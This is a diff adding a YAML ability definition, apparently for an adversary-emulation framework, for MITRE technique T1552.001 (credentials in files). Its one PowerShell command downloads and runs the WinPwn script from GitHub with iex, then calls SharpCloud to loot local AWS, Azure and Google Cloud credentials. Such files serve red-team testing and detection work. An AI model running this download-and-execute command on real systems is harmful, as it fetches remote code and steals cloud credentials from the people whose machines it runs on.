@@ -1,0 +1,20 @@
+---
+- id: c2941443b845d600bcfa520c969e3ada
+  name: WinPwn - Loot local Credentials - AWS, Microsoft Azure, and Google Compute
+    credentials
+  description: Loot local Credentials - AWS, Microsoft Azure, and Google Compute credentials
+    technique via function of WinPwn
+  tactic: credential-access
+  technique:
+    attack_id: T1552.001
+    name: 'Unsecured Credentials: Credentials In Files'
+  platforms:
+    windows:
+      psh:
+        command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');
+          SharpCloud -consoleoutput -noninteractive
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
